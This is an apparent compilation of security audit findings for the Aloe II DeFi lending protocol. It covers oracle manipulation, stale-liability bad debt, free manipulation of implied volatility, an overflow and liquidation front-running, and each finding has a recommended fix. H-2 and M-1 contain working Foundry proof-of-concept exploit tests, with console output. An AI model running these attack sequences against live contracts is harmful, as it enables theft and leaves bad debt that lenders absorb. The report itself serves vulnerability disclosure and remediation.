# Issue H-1: Oracle.sol: manipulation via increasing Uniswap V3 pool observationCardinality 

Source: https://github.com/sherlock-audit/2023-10-aloe-judging/issues/40 

## Found by 
roguereddwarf
This issue deals with how the `Oracle.consult` function can be provided with a malicious `seed` such as to return wrong results.  

This is a complex issue that requires multiple steps to be executed in order to set up and execute the attack.  

In depth knowledge of the UniswapV3 `observationCardinality` concept is needed as well as a wholesome understanding of the Aloe II protocol.  

This issue can occur as a result of an intentional attack but also as part of regular operation without attention to attack the protocol (even though unlikely).  

The corrupted data that the `Oracle.consult` function provides as a result of this issue is used upstream by the `VolatilityOracle`.  

The attack path is quite involved. However by exploiting this issue, the TWAP price can be manipulated as well as implied volatility (IV) and the probe prices.

## Vulnerability Detail
The [`Oracle.consult`](https://github.com/aloelabs/aloe-ii/blob/c71e7b0cfdec830b1f054486dfe9d58ce407c7a4/core/src/libraries/Oracle.sol#L42-L137) function takes a `uint40 seed` parameter and can be used in either of two ways:  
1. Set the highest 8 bit to a non-zero value [to use Uniswap V3's binary search to get observations](https://github.com/aloelabs/aloe-ii/blob/c71e7b0cfdec830b1f054486dfe9d58ce407c7a4/core/src/libraries/Oracle.sol#L51-L56)
2. Set the highest 8 bit to zero and use the lower 32 bits to provide hints and [use the more efficient internal `Oracle.observe` function to get the observations](https://github.com/aloelabs/aloe-ii/blob/c71e7b0cfdec830b1f054486dfe9d58ce407c7a4/core/src/libraries/Oracle.sol#L57-L81)

The code for Aloe's [`Oracle.observe`](https://github.com/aloelabs/aloe-ii/blob/c71e7b0cfdec830b1f054486dfe9d58ce407c7a4/core/src/libraries/Oracle.sol#L161-L205) function is adapted from Uniswap V3's [Oracle library](https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/Oracle.sol).

To understand this issue it is necessary to understand Uniswap V3's `observationCardinality` concept.

A deep dive can be found [here](https://uniswapv3book.com/docs/milestone_5/price-oracle/#observations-and-cardinality).  

In short, it is a circular array of variable size. The size of the array can be increased by ANYONE via calling [`Pool.increaseObservationCardinalityNext`](https://github.com/Uniswap/v3-core/blob/d8b1c635c275d2a9450bd6a78f3fa2484fef73eb/contracts/UniswapV3Pool.sol#L255-L267).  

The Uniswap V3 [`Oracle.write`](https://github.com/Uniswap/v3-core/blob/d8b1c635c275d2a9450bd6a78f3fa2484fef73eb/contracts/libraries/Oracle.sol#L78-L101) function will then take care of actually expanding the array once the current index has reached the end of the array. 

As can be seen in [this](https://github.com/Uniswap/v3-core/blob/d8b1c635c275d2a9450bd6a78f3fa2484fef73eb/contracts/libraries/Oracle.sol#L108-L120) function, uninitialized entries in the array have their timestamp set to `1`.  

And all other values in the observation struct (array element) are set to zero:  

```solidity
struct Observation {
    // the block timestamp of the observation
    uint32 blockTimestamp;
    // the tick accumulator, i.e. tick * time elapsed since the pool was first initialized
    int56 tickCumulative;
    // the seconds per liquidity, i.e. seconds elapsed / max(1, liquidity) since the pool was first initialized
    uint160 secondsPerLiquidityCumulativeX128;
    // whether or not the observation is initialized
    bool initialized;
}
```

Here's an example for a simplified array to illustrate how the Aloe `Oracle.observe` function might read an invalid value:  

```text
Assume we are looking for the target=10 timestamp.

And the observations array looks like this (element values are timestamps):

| 12 | 20 | 25 | 30 | 1 | 1 | 1 |

The length of the array is 7.

Let's say we provide the index 6 as the seed and the current observationIndex is 3 (i.e. pointing to timestamp 30)

The Oracle.observe function then chooses 1 as the left timestamp and 12 as the right timestamp.

This means the invalid and uninitialized element at index 6 with timestamp 1 will be used to calculate the Oracle values.
```

[Here](https://github.com/aloelabs/aloe-ii/blob/c71e7b0cfdec830b1f054486dfe9d58ce407c7a4/core/src/libraries/Oracle.sol#L190-L198) is the section of the `Oracle.observe` function where the invalid element is used to calculate the result.  

By updating the observations (e.g. swaps in the Uniswap pool), an attacker can influence the value that is written on the left of the array, i.e. he can arrange for a scenario such that he can make the Aloe `Oracle` read a wrong value.  

Upstream this causes the Aloe `Oracle` to continue calculation with `tickCumulatives` and `secondsPerLiquidityCumulativeX128s` haing a corrupted value. Either `secondsPerLiquidityCumulativeX128s[0]`, `tickCumulatives[0]` AND `secondsPerLiquidityCumulativeX128s[1]`, `tickCumulatives[1]` or only `secondsPerLiquidityCumulativeX128s[0]`, `tickCumulatives[0]` are assigned invalid values (depending on what the timestamp on the left of the array is).

## Impact
The corrupted values are then used in the [further calculations](https://github.com/aloelabs/aloe-ii/blob/c71e7b0cfdec830b1f054486dfe9d58ce407c7a4/core/src/libraries/Oracle.sol#L84-L135) in `Oracle.consult` which reports its results upstream to `VolatilityOracle.update` and `VolatilityOracle.consult`, making their way into the core application.  

The TWAP price can be inflated such that bad debt can be taken on due to inflated valuation of Uniswap V3 liqudity.

Besides that there are virtually endless possibilities for an attacker to exploit this scenario since the Oracle is at the very heart of the Aloe application and it's impossible to foresee all the permutations of values that a determined attacker may use.

E.g. the TWAP price is used for liquidations where an incorrect TWAP price can lead to profit.
If the protocol expects you to exchange 1 BTC for 10k USDC, then you end up with ~20k profit.

Since an attacker can make this scenario occur on purpose by updating the Uniswap observations (e.g. by executing swaps) and increasing observation cardinality, the severity of this finding is "High".  

## Code Snippet
Affected `Oracle.observe` function from Aloe II:
https://github.com/aloelabs/aloe-ii/blob/c71e7b0cfdec830b1f054486dfe9d58ce407c7a4/core/src/libraries/Oracle.sol#L57-L81

`Oracle` library from Uniswap V3 to see how to implement the necessary check for the `initialized` property:
https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/Oracle.sol

## Tool used
Manual Review

## Recommendation
The `Oracle.observe` function must not consider observations as valid that have not been initialized.  

This means the `initialized` field must be queried [here](https://github.com/aloelabs/aloe-ii/blob/c71e7b0cfdec830b1f054486dfe9d58ce407c7a4/core/src/libraries/Oracle.sol#L188) and [here](https://github.com/aloelabs/aloe-ii/blob/c71e7b0cfdec830b1f054486dfe9d58ce407c7a4/core/src/libraries/Oracle.sol#L171) and must be skipped over.  



## Discussion

**sherlock-admin2**

2 comment(s) were left on this issue during the judging contest.

**panprog** commented:
> high, great valid finding. It appears the price can only be made extremely high and most probably it's almost impossible to avoid seemsLegit to be true (because only one of the 2W-W or W-0 windows can be manipulated, the other will have correct value), but due to another bug, liquidation ignores seemsLegit, so at the very least this manipulation allows to liquidate almost all accounts with borrows, which is enough for it to be high.

**MohammedRizwan** commented:
>  seems intended design



**haydenshively**

Just note that #114 is not a duplicate.

# Issue H-2: `Borrower`'s `modify`, `liquidate` and `warn` functions use stored (outdated) account liabilities which makes it possible for the user to intentionally put him into bad debt in 1 transaction 

Source: https://github.com/sherlock-audit/2023-10-aloe-judging/issues/41 

## Found by 
0x007, 0xReiAyanami, Nyx, SilentDefendersOfDeFi, mstpr-brainbot, panprog, roguereddwarf

`Borrower._getLiabilities()` function returns **stored** borrow balance:
```solidity
function _getLiabilities() private view returns (uint256 amount0, uint256 amount1) {
    amount0 = LENDER0.borrowBalanceStored(address(this));
    amount1 = LENDER1.borrowBalanceStored(address(this));
}
```

Stored balance is the balance **at the last interest settlement**, which is different (less) than current balance if there were no transactions accuring interest for this lender for some time. This means that this function returns outdated liabilities. For example:
t=100: borrower1 borrows 10000 USDT
... no transactions
t=200: borrower1 borrowBalance = 10000.1 USDT (due to accured interest), but borrowBalanceStored = 10000 USDT (the amount at last interest accural).

`_getLiabilities` function is used by `Borrower`'s `modify`, `liquidate` and `warn` functions, meaning that it works on outdated account borrow balances (liabilities), including health check. This leads to multiple problems, such as:
1. `warn` and `liquidate` will revert trying to liquidate some accounts which just became unhealthy but were healthy at the last interest accural
2. `liquidate` will not repay full account borrowBalances
3. `modify` will allow account to be unhealthy after the actions it performs, if it's healthy using outdated stored borrow balances

The first 2 problems can be worked around by calling `Lender.accrueInterest` before `warn` or `liquidation`, which will settle interest rate fixing this problem. However, the 3rd issue is a lot more serious and can't be worked around as it allows malicious user to intentionally create bad debt in 1 transaction which will cause loss of funds for the other users.

## Vulnerability Detail

Possible scenario for the intentional creation of bad debt:
1. Borrow max amount at max leverage + some safety margin so that position is healthy for the next few days, for example borrow 10000 DAI, add margin of 1051 DAI for safety (51 DAI required for MAX_LEVERAGE, 1000 DAI safety margin)
2. Wait for a long period of market inactivity (such as 1 day).
3. At this point `borrowBalance` is greater than `borrowBalanceStored` by a value higher than `MAX_LEVERAGE` (example: borrowBalance = 10630 DAI, borrowBalanceStored = 10000 DAI)
3. Call `modify` and withdraw max possible amount (based on `borrowBalanceStored`), for example, withdraw 1000 DAI (remaining assets = 10051 DAI, which is healthy based on stored balance of 10000 DAI, but in fact this is already a bad debt, because borrow balance is 10630, which is more than remaining assets). This works, because liabilities used are outdated.

At this point the user is already in bad debt, but due to points 1-2, it's still not liquidatable. After calling `Lender.accrueInterest` the account can be liquidated. This bad debt caused is the funds lost by the other users.

This scenario is not profitable to the malicious user, but can be modified to make it profitable: the user can deposit large amount to lender before these steps, meaning the inflated interest rate will be accured by user's deposit to lender, but it will not be paid by the user due to bad debt (user will deposit 1051 DAI, withdraw 1000 DAI, and gain some share of accured 630 DAI, for example if he doubles the lender's TVL, he will gain 315 DAI - protocol fees).

## Impact

Malicious user can create bad debt to his account in 1 transaction. Bad debt is the amount not withdrawable from the lender by users who deposited. Since users will know that the lender doesn't have enough assets to pay out to all users, it can cause bank run since first users to withdraw from lender will be able to do so, while those who are the last to withdraw will lose their funds.

## Proof of concept

The scenario above is demonstrated in the test, create test/Exploit.t.sol:
```ts
// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity 0.8.17;

import "forge-std/Test.sol";

import {MAX_RATE, DEFAULT_ANTE, DEFAULT_N_SIGMA, LIQUIDATION_INCENTIVE} from "src/libraries/constants/Constants.sol";
import {Q96} from "src/libraries/constants/Q.sol";
import {zip} from "src/libraries/Positions.sol";

import "src/Borrower.sol";
import "src/Factory.sol";
import "src/Lender.sol";
import "src/RateModel.sol";

import {FatFactory, VolatilityOracleMock} from "./Utils.sol";

contract RateModelMax is IRateModel {
    uint256 private constant _A = 6.1010463348e20;

    uint256 private constant _B = _A / 1e18;

    /// @inheritdoc IRateModel
    function getYieldPerSecond(uint256 utilization, address) external pure returns (uint256) {
        unchecked {
            return (utilization < 0.99e18) ? _A / (1e18 - utilization) - _B : MAX_RATE;
        }
    }
}

contract ExploitTest is Test, IManager, ILiquidator {
    IUniswapV3Pool constant pool = IUniswapV3Pool(0xC2e9F25Be6257c210d7Adf0D4Cd6E3E881ba25f8);
    ERC20 constant asset0 = ERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    ERC20 constant asset1 = ERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    Lender immutable lender0;
    Lender immutable lender1;
    Borrower immutable account;

    constructor() {
        vm.createSelectFork(vm.rpcUrl("mainnet"));
        vm.rollFork(15_348_451);

        Factory factory = new FatFactory(
            address(0),
            address(0),
            VolatilityOracle(address(new VolatilityOracleMock())),
            new RateModelMax()
        );

        factory.createMarket(pool);
        (lender0, lender1, ) = factory.getMarket(pool);
        account = factory.createBorrower(pool, address(this), bytes12(0));
    }

    function setUp() public {
        // deal to lender and deposit (so that there are assets to borrow)
        deal(address(asset0), address(lender0), 10000e18); // DAI
        deal(address(asset1), address(lender1), 10000e18); // WETH
        lender0.deposit(10000e18, address(12345));
        lender1.deposit(10000e18, address(12345));

        deal(address(account), DEFAULT_ANTE + 1);
    }

    function test_selfLiquidation() public {

        // malicious user borrows at max leverage + some safety margin
        uint256 margin0 = 51e18 + 1000e18;
        uint256 borrows0 = 10000e18;

        deal(address(asset0), address(account), margin0);

        bytes memory data = abi.encode(Action.BORROW, borrows0, 0);
        account.modify(this, data, (1 << 32));

        assertEq(lender0.borrowBalance(address(account)), borrows0);
        assertEq(asset0.balanceOf(address(account)), borrows0 + margin0);

        // skip 1 day (without transactions)
        skip(86400);

        emit log_named_uint("User borrow:", lender0.borrowBalance(address(account)));
        emit log_named_uint("User stored borrow:", lender0.borrowBalanceStored(address(account)));

        // withdraw all the "extra" balance putting account into bad debt
        bytes memory data2 = abi.encode(Action.WITHDRAW, 1000e18, 0);
        account.modify(this, data2, (1 << 32));

        // account is still not liquidatable (because liquidation also uses stored liabilities)
        vm.expectRevert();
        account.warn((1 << 32));

        // make account liquidatable by settling accumulated interest
        lender0.accrueInterest();

        // warn account
        account.warn((1 << 32));

        // skip warning time
        skip(LIQUIDATION_GRACE_PERIOD);
        lender0.accrueInterest();

        // liquidation reverts because it requires asset the account doesn't have to swap
        vm.expectRevert();
        account.liquidate(this, bytes(""), 1, (1 << 32));

        emit log_named_uint("Before liquidation User borrow:", lender0.borrowBalance(address(account)));
        emit log_named_uint("Before liquidation User stored borrow:", lender0.borrowBalanceStored(address(account)));
        emit log_named_uint("Before liquidation User assets:", asset0.balanceOf(address(account)));

        // liquidate with max strain to avoid revert when trying to swap assets account doesn't have
        account.liquidate(this, bytes(""), type(uint256).max, (1 << 32));

        emit log_named_uint("Liquidated User borrow:", lender0.borrowBalance(address(account)));
        emit log_named_uint("Liquidated User assets:", asset0.balanceOf(address(account)));
    }

    enum Action {
        WITHDRAW,
        BORROW,
        UNI_DEPOSIT
    }

    // IManager
    function callback(bytes calldata data, address, uint208) external returns (uint208 positions) {
        require(msg.sender == address(account));

        (Action action, uint256 amount0, uint256 amount1) = abi.decode(data, (Action, uint256, uint256));

        if (action == Action.WITHDRAW) {
            account.transfer(amount0, amount1, address(this));
        } else if (action == Action.BORROW) {
            account.borrow(amount0, amount1, msg.sender);
        } else if (action == Action.UNI_DEPOSIT) {
            account.uniswapDeposit(-75600, -75540, 200000000000000000);
            positions = zip([-75600, -75540, 0, 0, 0, 0]);
        }
    }

    // ILiquidator
    receive() external payable {}

    function swap1For0(bytes calldata data, uint256 actual, uint256 expected0) external {
        /*
        uint256 expected = abi.decode(data, (uint256));
        if (expected == type(uint256).max) {
            Borrower(payable(msg.sender)).liquidate(this, data, 1, (1 << 32));
        }
        assertEq(actual, expected);
        */
        pool.swap(msg.sender, false, -int256(expected0), TickMath.MAX_SQRT_RATIO - 1, bytes(""));
    }

    function swap0For1(bytes calldata data, uint256 actual, uint256 expected1) external {
        /*
        uint256 expected = abi.decode(data, (uint256));
        if (expected == type(uint256).max) {
            Borrower(payable(msg.sender)).liquidate(this, data, 1, (1 << 32));
        }
        assertEq(actual, expected);
        */
        pool.swap(msg.sender, true, -int256(expected1), TickMath.MIN_SQRT_RATIO + 1, bytes(""));
    }

    // IUniswapV3SwapCallback
    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata) external {
        if (amount0Delta > 0) asset0.transfer(msg.sender, uint256(amount0Delta));
        if (amount1Delta > 0) asset1.transfer(msg.sender, uint256(amount1Delta));
    }

    // Factory mock
    function getParameters(IUniswapV3Pool) external pure returns (uint248 ante, uint8 nSigma) {
        ante = DEFAULT_ANTE;
        nSigma = DEFAULT_N_SIGMA;
    }

    // (helpers)
    function _setInterest(Lender lender, uint256 amount) private {
        bytes32 ID = bytes32(uint256(1));
        uint256 slot1 = uint256(vm.load(address(lender), ID));

        uint256 borrowBase = slot1 % (1 << 184);
        uint256 borrowIndex = slot1 >> 184;

        uint256 newSlot1 = borrowBase + (((borrowIndex * amount) / 10_000) << 184);
        vm.store(address(lender), ID, bytes32(newSlot1));
    }
}
```

Execution console log:
```solidity
  User borrow:: 10629296791890000000000
  User stored borrow:: 10000000000000000000000
  Before liquidation User borrow:: 10630197795010000000000
  Before liquidation User stored borrow:: 10630197795010000000000
  Before liquidation User assets:: 10051000000000000000000
  Liquidated User borrow:: 579197795010000000001
  Liquidated User assets:: 0
```

As can be seen, in the end user debt is 579 DAI with 0 assets.

## Code Snippet

`Borrower._getLiabilities()` returns stored balances:
https://github.com/sherlock-audit/2023-10-aloe/blob/main/aloe-ii/core/src/Borrower.sol#L527-L530

`borrowBalanceStored` uses `borrowIndex` (which is index at last accural):
https://github.com/sherlock-audit/2023-10-aloe/blob/main/aloe-ii/core/src/Ledger.sol#L226-L232

For comparision, `borrowBalance` uses `_previewInterest` to get current borrow balance:
https://github.com/sherlock-audit/2023-10-aloe/blob/main/aloe-ii/core/src/Ledger.sol#L216-L223

`Borrower.warn` uses `_getLiabilities`:
https://github.com/sherlock-audit/2023-10-aloe/blob/main/aloe-ii/core/src/Borrower.sol#L166

`liquidate` uses `_getLiabilities`:
https://github.com/sherlock-audit/2023-10-aloe/blob/main/aloe-ii/core/src/Borrower.sol#L211

`modify` also uses `_getLiabilities`:
https://github.com/sherlock-audit/2023-10-aloe/blob/main/aloe-ii/core/src/Borrower.sol#L314


## Tool used

Manual Review

## Recommendation

Consider using `borrowBalance` instead of `borrowBalanceStored` in `_getLiabilities()`.



## Discussion

**sherlock-admin2**

1 comment(s) were left on this issue during the judging contest.

**MohammedRizwan** commented:
>  valid issue



# Issue H-3: IV Can be Decreased for Free 

Source: https://github.com/sherlock-audit/2023-10-aloe-judging/issues/63 

## Found by 
0xweb3boy, Bandit, mstpr-brainbot, pks\_, roguereddwarf

The liquidity parameter used to calculate IV costs nothing to massively manipulate upwards and doesn't require a massive amount of capital. This makes IV easy to manipulate downwards.

## Vulnerability Detail

The liquidity at a single `tickSpacing` is used to calcualte the `IV`. The more liquidity is in this tick spacing, the lower the `IV`, as demonstarated by the `tickTvl` dividing the return value of the `estimate` function:

```solidity
            return SoladyMath.sqrt((4e24 * volumeGamma0Gamma1 * scale) / (b.timestamp - a.timestamp) / tickTvl);
```

Since this is using data only from the block that the function is called, the liuquidyt can easily be increased by: 

1. depositing a large amount liquidity into the `tickSpacing`
2. calling update
3. removing the liquidity

Note that only a small portion of the total liquidity is in the entire pool is in the active liquidity tick. Therefore, the capital cost required to massively increase the liquidity is low. Additionally, the manipulation has zero cost (aside from gas fees), as no trading is done through the pool. Contract this with a pool price manipulation, which costs a significant amount of trading fees to trade through a large amount of the liquidity of the pool.

Since this manipulation costs nothing except gas, the `IV_CHANGE_PER_UPDATE` which limits of the amount that IV can be manipulated per update does not sufficiently disincentivise manipulation, it just extends the time period required to manipulate.

Decreasing the IV increases the LTV, and due to the free cost, its reasonable to increase the LTV to the max LTV of 90% even for very volatile assets. Aloe uses the IV to estimate the probability of insolvency of loans. With the delay inherent in TWAP oracle and the liquidation delay by the `warn`-then-liquidate process, this manipulation can turn price change based insolvency from a 5 sigma event (as designed by the protocol) to a likely event.

## Impact

- Decreasing IV can be done at zero cost aside from gas fees. 
- This can be used to borrow assets at far more leverage than the proper LTV
- Borrowers can use this to avoid liquidation
- This also breaks the insolvency estimation based on IV for riskiness of price-change caused insolvency.

## Code Snippet

https://github.com/sherlock-audit/2023-10-aloe/blob/main/aloe-ii/core/src/libraries/Volatility.sol#L44-L81

## Tool used

Manual Review

## Recommendation

Use the time weighted average liquidity of in-range ticks of the recent past, so that single block + single tickSpacing liquidity deposits cannot manipulate IV significantly.



## Discussion

**sherlock-admin2**

1 comment(s) were left on this issue during the judging contest.

**MohammedRizwan** commented:
>  valid



# Issue H-4: Oracle.sol: observe function has overflow risk and should cast to uint256 like Uniswap V3 does 

Source: https://github.com/sherlock-audit/2023-10-aloe-judging/issues/85 

## Found by 
roguereddwarf
The `Oracle.observe` function basically uses the same math from the Uniswap V3 code to search for observations.  

In comparison to Uniswap V3, the `Oracle.observe` function takes a `seed` such that the runtime of the function can be decreased by calculating the `seed` off-chain to act as a hint for finding the observation.  

In the process of copying the Uniswap V3 code, a `uint256` cast has been forgotten which introduces a risk of intermediate overflow in the `Oracle.observe` function.  

Thereby the `secondsPerLiquidityCumulativeX128` return value can be wrong which can corrupt the implied volatility (ÌV) calculation.  

## Vulnerability Detail
Looking at the `Oracle.observe` function, the `secondsPerLiquidityCumulativeX128` return value is calculated as follows:

https://github.com/aloelabs/aloe-ii/blob/c71e7b0cfdec830b1f054486dfe9d58ce407c7a4/core/src/libraries/Oracle.sol#L196
```solidity
liqCumL + uint160(((liqCumR - liqCumL) * delta) / denom)
```

The calculation is done in an `unchecked` block. `liqCumR` and `liqCumL` have type `uint160`.  
`delta` and `denom` have type `uint56`.  

Let's compare this to the Uniswap V3 code.

https://github.com/Uniswap/v3-core/blob/d8b1c635c275d2a9450bd6a78f3fa2484fef73eb/contracts/libraries/Oracle.sol#L279-L284
```solidity
beforeOrAt.secondsPerLiquidityCumulativeX128 +
    uint160(
        (uint256(
            atOrAfter.secondsPerLiquidityCumulativeX128 - beforeOrAt.secondsPerLiquidityCumulativeX128
        ) * targetDelta) / observationTimeDelta
    )
```

The result of `atOrAfter.secondsPerLiquidityCumulativeX128 - beforeOrAt.secondsPerLiquidityCumulativeX128` is cast to `uint256`.  

That's because multiplying the result by `targetDelta` can overflow the `uint160` type.  

The maximum value of `uint160` is roughly `1.5e48`.  

`delta` is simply the time difference between `timeL` and `target` in seconds.  

The `secondsPerLiquidityCumulative` values are accumulators that are calculated as follows:
https://github.com/Uniswap/v3-core/blob/d8b1c635c275d2a9450bd6a78f3fa2484fef73eb/contracts/libraries/Oracle.sol#L41-L42
```solidity
secondsPerLiquidityCumulativeX128: last.secondsPerLiquidityCumulativeX128 +
    ((uint160(delta) << 128) / (liquidity > 0 ? liquidity : 1)),
```

If `liquidity` is very low and the time difference between observations is very big (hours to days), this can lead to the intermediate overflow in the `Oracle` library, such that the `secondsPerLiquidityCumulative` is much smaller than it should be.  

The lowest value for the above division is `1`. In that case the accumulator grows by `2^128` (`~3.4e38`) every second.

If observations are apart 24 hours (`86400 seconds`), this can lead to an overflow:
Assume for simplicity `target - timeL = timeR - timeL`
```text
(liqCumR - liqCumL) * delta = 3.4e38 * 86400 * 86400 > 1.5e48`
```

## Impact
The corrupted return value affects the [`Volatility` library](https://github.com/aloelabs/aloe-ii/blob/c71e7b0cfdec830b1f054486dfe9d58ce407c7a4/core/src/libraries/Volatility.sol#L121). Specifically, the IV calculation.    

This can lead to wrong IV updates and LTV ratios that do not reflect the true IV, making the application more prone to bad debt or reducing capital efficiency.  

## Code Snippet
https://github.com/aloelabs/aloe-ii/blob/c71e7b0cfdec830b1f054486dfe9d58ce407c7a4/core/src/libraries/Oracle.sol#L196

https://github.com/Uniswap/v3-core/blob/d8b1c635c275d2a9450bd6a78f3fa2484fef73eb/contracts/libraries/Oracle.sol#L279-L284

## Tool used
Manual Review

## Recommendation
Perform the same cast to `uint256` that Uniswap V3 performs:  
```solidity
liqCumL + uint160((uint256(liqCumR - liqCumL) * delta) / denom)
```



## Discussion

**sherlock-admin2**

2 comment(s) were left on this issue during the judging contest.

**tsvetanovv** commented:
> I don't think this is problem because liqCumR and liqCumL are uint160 

**MohammedRizwan** commented:
>  valid



**haydenshively**

Valid high, will fix

# Issue H-5: Borrows are not properly handled in the case of both liabilities0 and liabilities1 unable to be repaid from available assets 

Source: https://github.com/sherlock-audit/2023-10-aloe-judging/issues/104 

## Found by 
Chinmay, panprog
After withdrawing the uniswap positions, the aggregate amount of assets( fixed assets + withdrawn uni positions + fees) is used to pay back the borrowed assets and if any one of assets has a shortfall, then the other asset is swapped into it to pay back to the lender. But if both liabilities are non-zero after repayment from the balances, nothing is swapped, whatever can be repaid is repaid and the remaining bad debt borrows is left untouched. The problem is that these left borrows will keep accruing more interest in Lender's accounting and will lead to an increased bad debt. 

## Vulnerability Detail
Borrower.sol Line 252 is meant to swap only if one asset is surplus and one is in shortfall. But the checks above that state that if liabilities0 and liabilities1 are non-zero nothing more can be done. If a a borrower account ever arrives in such a situation, then the remaining unpaid borrow amounts will be left as it is in the Lender's accounting and keep accruing more and more interest forever. 
Instead, the bad debt should be absorbed into the pool then and there and the accounting updated to make the pending borrows zero(which means shares are going to be diluted a little bit but think about the scenario if many such big positions are hanging in the borrows and accruing interest continuously, eventually the losses to lenders will be higher) and the borrower blacklisted for just this case. 

## Impact
Lenders continuously accrue losses in the form of bad debt for positions that have no left collateral and the borrower will never pay back that debt because he will lose money. Thus, if many such positions exist, the total borrows will keep growing that have no backing collateral, causing a risk of some of the lenders not being able to withdraw in the future because of this pending borrow amount.

## Code Snippet
https://github.com/sherlock-audit/2023-10-aloe/blob/b60c21af24738d517941f18f7caa8c7272f771c5/aloe-ii/core/src/Borrower.sol#L241

## Tool used

Manual Review

## Recommendation
In the liquidate function, if both liabilities0 and liabilities1 are non-zero, close the position and absorb bad debt into the lender contracts' accounting and blacklist the borrower. 



## Discussion

**sherlock-admin2**

2 comment(s) were left on this issue during the judging contest.

**panprog** commented:
> valid medium, dup of #32

**MohammedRizwan** commented:
>  valid



**haydenshively**

I believe #42 and #43 are duplicates of this

# Issue M-1: It is possible to frontrun liquidations with self liquidation with high strain value to clear warning and keep unhealthy positions from liquidation 

Source: https://github.com/sherlock-audit/2023-10-aloe-judging/issues/29 

## Found by 
panprog, rvierdiiev

Account liquidation involving asset swaps requires warning the account first via `warn`. Liquidation can only happen `LIQUIDATION_GRACE_PERIOD` (2 minutes) after the warning. The problem is that any liquidation clears the warning state, including partial liquidations even with very high strain value. This makes it possible to frontrun any liquidation (or just submit transactions as soon as LIQUIDATION_GRACE_PERIOD expires) by self-liquidating with very high strain amount (which basically keeps position unchanged and still unhealthy). This clears the warning state and allows account to be unliquidatable for 2 more minutes, basically preventing (DOS'ing) liquidators from performing their job.

Malicious user can open a huge borrow position with minimum margin and can keep frontrunning liquidations this way, basically allowing unhealthy position remain active forever. This can easily lead to position going into bad debt and causing loss of funds for the other protocol users (as they will not be able to withdraw all their funds due to account's bad debt).

## Vulnerability Detail

`Borrower.warn` sets the time when the liquidation (involving swap) can happen:
```solidity
slot0 = slot0_ | ((block.timestamp + LIQUIDATION_GRACE_PERIOD) << 208);
```

But `Borrower.liquidation` clears the warning regardless of whether account is healthy or not after the repayment:
```solidity
_repay(repayable0, repayable1);
slot0 = (slot0_ & SLOT0_MASK_POSITIONS) | SLOT0_DIRT;
```

## Impact

Very important protocol function (liquidation) can be DOS'ed and make the unhealthy accounts avoid liquidations for a very long time. Malicious users can thus open huge risky positions which will then go into bad debt causing loss of funds for all protocol users as they will not be able to withdraw their funds and can cause a bank run - first users will be able to withdraw, but later users won't be able to withdraw as protocol won't have enough funds for this.

## Proof of concept

The scenario above is demonstrated in the test, add this to Liquidator.t.sol:
```solidity
function test_liquidationFrontrun() public {
    uint256 margin0 = 1595e18;
    uint256 margin1 = 0;
    uint256 borrows0 = 0;
    uint256 borrows1 = 1e18 * 100;

    // Extra due to rounding up in liabilities
    margin0 += 1;

    deal(address(asset0), address(account), margin0);
    deal(address(asset1), address(account), margin1);

    bytes memory data = abi.encode(Action.BORROW, borrows0, borrows1);
    account.modify(this, data, (1 << 32));

    assertEq(lender0.borrowBalance(address(account)), borrows0);
    assertEq(lender1.borrowBalance(address(account)), borrows1);
    assertEq(asset0.balanceOf(address(account)), borrows0 + margin0);
    assertEq(asset1.balanceOf(address(account)), borrows1 + margin1);

    _setInterest(lender0, 10100);
    _setInterest(lender1, 10100);

    account.warn((1 << 32));

    uint40 unleashLiquidationTime = uint40((account.slot0() >> 208) % (1 << 40));
    assertEq(unleashLiquidationTime, block.timestamp + LIQUIDATION_GRACE_PERIOD);

    skip(LIQUIDATION_GRACE_PERIOD + 1);

    // listen for liquidation, or be the 1st in the block when warning is cleared
    // liquidate with very high strain, basically keeping the position, but clearing the warning
    account.liquidate(this, bytes(""), 1e10, (1 << 32));

    unleashLiquidationTime = uint40((account.slot0() >> 208) % (1 << 40));
    assertEq(unleashLiquidationTime, 0);

    // the liquidation command we've frontrun will now revert (due to warning not set: "Aloe: grace")
    vm.expectRevert();
    account.liquidate(this, bytes(""), 1, (1 << 32));
}
```

## Code Snippet

`Borrower.warn` sets the liquidation timer:
https://github.com/sherlock-audit/2023-10-aloe/blob/main/aloe-ii/core/src/Borrower.sol#L171

`Borrower.liquidate` clears it regardless of strain:
https://github.com/sherlock-audit/2023-10-aloe/blob/main/aloe-ii/core/src/Borrower.sol#L281

This makes **any** liquidation (even the one which doesn't affect assets much due to high strain amount) clear the warning.

## Tool used

Manual Review

## Recommendation

Consider clearing "warn" status only if account is healthy after liquidation.

# Issue M-2: Large bad debt can cause bank run since there is no loss socialization mechanism 

Source: https://github.com/sherlock-audit/2023-10-aloe-judging/issues/32 

## Found by 
Bandit, panprog, rvierdiiev

When a large bad debt happens in the system, it is "stuck" in the system forever with no incentive to cover it. User, whose account goes into bad debt has no incentive to add funds to it, he will simply use a new account. And the other users also don't have any incentive to repay bad debt for such user.

This means that the other users will never be unable to withdraw all funds due to this bad debt. This can cause a bank run, since the first users will be able to withdraw, but the last users to withdraw will be unable to do so (will lose funds), because protocol won't have enough funds to return them since this bad debt will remain unreturned infinitively and will, in fact, keep accumulating even more bad debt.

## Vulnerability Detail

If some users takes a huge borrow and later there is a quick price drop, which will cause user's account to fall into a large bad debt, there will be no incentive for the liquidators to fully liquidate user, because the assets he has won't be enough to compensate the liquidator, meaning partial liquidations will bring user to a state with 0 assets but still with borrowed assets (bad debt).

Since there is no incentive from any users to repay these assets, this borrow will remain in the system forever, meaning this is basically a loss of funds for the other users. If this accumulated bad debt is large enough, the users will notice this and might start a bank run, because the users who withdraw first will be able to do so, but those who try to withdraw later will be unable to do so, because the protocol won't have funds, only the "borrowed" amounts which will never be returned due to bad debt (those accounts only having borrow/debt without any assets).

## Impact

Bad debt accumulation can lead to a bank run from the users with the last users to withdraw losing all their funds without any ability to recover it.

## Code Snippet

`Borrower.liquidate` doesn't care about bad debt, leaving it up to liquidators to choose correct `strain` amount to only get all assets the user has after liquidation, so that it doesn't revert:
https://github.com/sherlock-audit/2023-10-aloe/blob/main/aloe-ii/core/src/Borrower.sol#L257-L277

## Tool used

Manual Review

## Recommendation

Consider introducing bad debt socialization mechanism like the other lending platforms (bad debt will then reduce the `borrowIndex`, thus socializing the loss between all lenders). It will also help clear borrow balance from bad debt accounts, preventing it to further accumulate even more bad debt.



